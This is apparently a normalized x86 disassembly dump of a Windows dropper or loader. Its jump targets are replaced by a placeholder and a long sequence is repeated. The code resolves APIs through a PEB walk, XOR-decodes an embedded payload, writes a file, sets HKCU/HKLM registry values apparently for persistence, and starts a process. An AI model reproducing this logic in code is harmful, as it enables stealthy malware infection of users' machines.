mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_44fe90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_44ffc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_44f27d
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_44fe90
add esp 0x4
call sub_450050
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_450080
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_450080
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_44fe90
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_44fe90
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_44fe90
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_44fe90
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x1
push 0x40000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0x558 ] eax
cmp [ ebp - 0x558 ] 0xffffffff
je rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
push 0x37b18
mov ecx [ ebp - 0x148 ]
push ecx
call sub_44ffc0
add esp 0x8
push 0x0
lea edx [ ebp - 0x550 ]
push edx
push 0x37b18
mov eax [ ebp - 0x148 ]
push eax
mov ecx [ ebp - 0x558 ]
push ecx
call [ ebp - 0x28c ]
mov edx [ ebp - 0x558 ]
push edx
call [ ebp - 0x13c ]
mov eax [ ebp - 0x144 ]
and eax 0x100
je rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000002
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
jmp rwxdata
mov [ ebp - 0x574 ] 0x44
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
mov [ ebp - 0x300 ] 0x44
mov [ ebp - 0x2d4 ] 0x81
mov eax [ ebp - 0x144 ]
and eax 0x1000
je rwxdata
mov ecx [ ebp - 0x574 ]
sub ecx 0x1
mov [ ebp - 0x574 ] ecx
mov edx [ ebp - 0x574 ]
mov [ ebp + edx - 0x300 ] 0x0
jmp rwxdata
cmp [ ebp - 0x130 ] 0xa
jae rwxdata
mov edx 0x5
mov [ ebp - 0x2d0 ] dx
xor ecx ecx
mov [ ebp - 0x2d0 ] cx
jmp rwxdata
cmp [ ebp - 0x574 ] 0x0
je rwxdata
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x410 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x414 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x278 ]
push eax
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x55c ]
mov [ ebp - 0x2ac ] 0x0
jmp rwxdata
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x2ac ]
movsx edx [ ebp + ecx - 0x530 ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x130 ]
movsx edx [ ebp + ecx - 0x410 ]
cmp edx 0x2f
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x410 ]
cmp eax 0x2f
jne rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov edx [ ebp - 0x138 ]
push edx
call [ ebp - 0x534 ]
mov ecx [ ebp - 0x2ac ]
push ecx
lea edx [ ebp - 0x530 ]
push edx
push 0x1
push 0x0
lea eax [ ebp - 0x260 ]
push eax
mov ecx [ ebp - 0x138 ]
push ecx
call [ ebp - 0x268 ]
mov [ ebp - 0x2b4 ] eax
mov eax [ ebp - 0x2ac ]
add eax 0x1
mov [ ebp - 0x2ac ] eax
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
jmp rwxdata
jmp rwxdata
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
test ecx ecx
je rwxdata
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
mov edx [ ebp - 0x18 ]
imul edx edx 0xa
mov eax [ ebp - 0x130 ]
movsx ecx [ ebp + eax - 0x410 ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x18 ] edx
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
sub_44fe90
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x13 ] 0x1
mov [ ebp - 0x12 ] 0x2
mov [ ebp - 0x11 ] 0x10
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0xf ] 0x4
mov [ ebp - 0xe ] 0x8
mov [ ebp - 0xd ] 0x8
mov [ ebp - 0xc ] 0x10
mov [ ebp - 0xb ] 0x2
mov [ ebp - 0xa ] 0x20
mov [ ebp - 0x9 ] 0x40
mov [ ebp - 0x8 ] 0x40
mov [ ebp - 0x7 ] 0x20
mov [ ebp - 0x6 ] 0x80
mov [ ebp - 0x5 ] 0x80
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov [ ebp - 0x1c ] 0x0
jmp rwxdata
jmp rwxdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x4 ]
jge rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp rwxdata
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x20 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movsx ecx [ eax ]
cmp ecx 0x20
jne rwxdata
cmp [ ebp - 0x20 ] 0x8
jge rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
mov [ edx + 0x1 ] 0x0
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jle rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x1c ]
mov al [ ebp - 0x15 ]
mov [ edx ] al
jmp rwxdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x1c ]
movsx ecx [ eax ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x14 ]
and ecx eax
je rwxdata
jmp rwxdata
mov eax [ ebp - 0x1c ]
add eax 0x1
mov [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
not eax
and ecx eax
mov [ ebp - 0x24 ] ecx
movzx ecx [ ebp - 0x15 ]
mov edx [ ebp - 0x20 ]
movzx eax [ ebp + edx * 2 - 0x13 ]
or ecx eax
mov [ ebp - 0x24 ] ecx
jmp rwxdata
mov edx [ ebp - 0x4 ]
sub edx 0x1
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov cl [ ebp - 0x24 ]
mov [ ebp - 0x15 ] cl
jmp rwxdata
sub_44ffc0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jge rwxdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
cmp eax 0x64
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx ]
xor eax 0x80be78ab
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ecx ] al
jmp rwxdata
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx + 0x1 ]
cmp edx 0x7d
jne rwxdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x77
jne rwxdata
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0x6 ]
cmp eax 0x61
jne rwxdata
mov ecx [ ebp - 0x4 ]
add ecx 0x3e4
mov [ ebp - 0x4 ] ecx
sub_450050
push ebp
mov ebp esp
push ecx
mov eax [ fs : 0x30 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_450080
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0xc ] eax
